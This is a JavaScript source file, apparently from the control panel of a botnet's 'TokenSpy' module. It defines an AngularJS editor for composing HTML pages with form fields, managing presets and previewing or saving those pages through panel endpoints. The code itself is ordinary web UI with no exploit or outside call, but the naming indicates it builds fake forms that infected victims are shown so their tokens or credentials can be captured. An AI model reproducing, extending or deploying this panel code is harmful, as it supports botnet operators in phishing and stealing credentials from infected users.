'use strict';

require(['page-botnet_tokenspy-editpage-loader'], function(AppLoader){
    if (window.data.tokenspy.editpage.controlled)
        AppLoader.standby();
    else
        AppLoader.init();
});

define('page-botnet_tokenspy-editpage-loader', ['jquery'], function($){

    var init = function(page, skeleton){
        require(['page-botnet_tokenspy-editpage'], function(App){
            App.init(
                document.getElementById('tokenspy-pageadmin'),
                $.extend(window.data.tokenspy.editpage, {page: page, skeleton: skeleton})
            );
        });
    };

    return {
        /** Launch the app right now
         */
        init: init,

        /** Puts the app in "standby" mode where it listens to window.'app-init' event
         */
        standby: function(){
            // The event which allows external control of the window
            $(window).on('app-init', function(e,page, skeleton){
                init(page, skeleton);
            });

            // Emit the 'app-standby' event
            // As the event is cross-windowed and custom, we can't use jQuery.trigger() for that
            window.dispatchEvent(new CustomEvent('app-standby', {}));
        },

        /** Launches the app being in the 'standby' mode
         */
        launch: function(){
            $(window).trigger('app-init');
        }
    };
});



define('page-botnet_tokenspy-editpage', ['angular', 'underscore', 'jquery', 'ckeditor', 'bootstrap', 'angular-extensions'], function(angular, _, $){
    'use strict';

    var init = function(ngApp, appData){
        var app = angular.module('TokenSpy.editpage', ['Extensions']);

        // Controller
        app.controller('TsPageAdminCtrl', ['$scope', '$element', function($scope, $element){
            $scope.entityTitle = appData.entityTitle;
            $scope.class = appData.class;
            $scope.page = _.defaults(appData.page || {}, {
                name: undefined, // is better than `null` as it converts to an empty string
                title: undefined,
                timeout: 0,
                data: {}
            });
            $scope.skeleton = appData.skeleton; // to preview in the current template

            $scope.availableTemplates = appData.availableTemplates;
            $scope.pagePresets = appData.pagePresets;
            $scope.pagePreset = {id: null, name: null};

            // Defaults
            if (!$scope.page) $scope.page = {};
            if (!$scope.page.data) $scope.page.data = {};

            // page.name=form Toolbox
            var $formEditor = $element.get('#ts-editpage-formEditor');
            $scope.formToolbox = {
                addInputText: function($event){
                    if (!$scope.page.data.form)
                        $scope.page.data.form = '';

                    var html = _.template(
                        '<div class="control-group">\r\n'+
                        '    <label class="control-label" contenteditable><%- title %></label>\r\n'+
                        '    <div class="controls">\r\n'+
                        '        <input type="text" name="<%= inputName %>" />\r\n'+
                        '        <span class="help-block" contenteditable><%- help %></span>\r\n'+
                        '    </div>\r\n'+
                        '</div>\r\n'
                    );
                    $scope.page.data.form += html({
                        inputName: window.prompt('New input name:', ''),
                        title: 'Title',
                        help: 'Help'
                    });

                    $event.preventDefault();
                },
                removeLastInput: function($event){
                    $('#ts-editpage-formeditor').find('.control-group:last').remove().end().trigger('input');

                    $event.preventDefault();
                }
            };

            // Update page preset name on page title change
            $scope.$watch('page.title', function(newValue, oldValue){
                if ($scope.pagePreset && $scope.pagePreset.id) return; // don't overwrite
                $scope.pagePreset.name = newValue;
            });

            /** AJAX page preview
             * @param $event
             */
            $scope.ajaxPagePreview = function($event, isSkeleton){
                var href = $($event.target).attr('href');

                var data = {page: $scope.page};
                if (isSkeleton)
                    data.skeleton = JSON.stringify($scope.skeleton);

                $.post(href, data, function(html){
                    var win=window.open('about:blank', 'popup', 'width=800,height=600');

                    win.document.open();
                    win.document.write(html);
                    win.document.close();
                });
                $event.preventDefault();
            };

            /** AJAX page save preset
             * @param $event
             */
            $scope.ajaxPageSavePreset = function($event){
                var post = {
                    id: $scope.pagePreset.id,
                    name: $scope.pagePreset.name,
                    page: $scope.page
                };

                $.post('?m=botnet_tokenspy/ajaxPagePreset.json', post, function(pagePreset){
                    // Add to the list
                    $scope.pagePresets[ pagePreset.id ] = pagePreset.name;
                    // Set current
                    $scope.pagePreset = pagePreset;

                    $scope.$apply();
                    $('#ts-editpage-save-preset').modal('hide');
                });

                $event.preventDefault();
            };

            /** AJAX page pick preset
             * @param $event
             */
            $scope.ajaxPagePickPreset = function($event, id){
                id = id || $scope.pagePreset.id;

                $.post('?m=botnet_tokenspy/ajaxPagePreset.json', {id: id}, function(pagePreset){
                    $scope.pagePreset = pagePreset;
                    $scope.page = pagePreset.page;

                    $scope.$apply();
                    $('#ts-editpage-pick-preset').modal('hide');

                    // In hotPresets shortcut mode, apply the preset immediately
                    if (appData.hotPresets)
                        $scope.ajaxSavePage($scope.page);
                });

                $event.preventDefault();
            };

            /** AJAX page delete preset
             * @param $event
             * @param id
             */
            $scope.ajaxPageDeletePreset = function($event, id){
                $.post('?m=botnet_tokenspy/ajaxPagePreset.json', { delete: true, id: id}, function(){
                    delete $scope.pagePresets[ id ];
                    if ($scope.pagePreset.id == id)
                        $scope.pagePreset = {id: null, name: null};
                    $scope.$apply();
                });

                $event.preventDefault();
            };

            /** AJAX submit the form
             * Also triggers the 'ts-page-save' event
             */
            $scope.ajaxSavePage = function(page){
                $scope.ajaxSavePage.ok = undefined;
                $scope.ajaxSavePage.error = undefined;

                // Trigger a window-level event
                $(window).trigger('ts-page-save', page);

                // AJAX
                if (!appData.controlled){
                    var $submit = $element.find(':submit');
                    $submit.button('loading');

                    $.post(window.location.href, {page: page}, function(data){
                        if (data && data.ok)
                            $scope.ajaxSavePage.ok = true;
                        else
                            $scope.ajaxSavePage.error = data;

                        $submit.button('reset');

                        $scope.$apply();

                        // Close the parent window's colorbox
                        if (data.ok)
                            try { window.parent.$.colorbox.close(); } catch(e){}
                    });
                }
            };

            // In hotPresets shortcut mode, open presets manager immediately
            if (appData.hotPresets){
                $('#tokenspy-pageadmin .btn-toolbar .btn[href="#ts-editpage-pick-preset"]').click();
            }
        }]);

        // Bootstrap
        if (!ngApp)
            window.console && console.error("Can't angular.bootstrap() on ", ngApp);
        else
            angular.bootstrap(ngApp, ['TokenSpy.editpage']);
    };

    return { init: init };
});
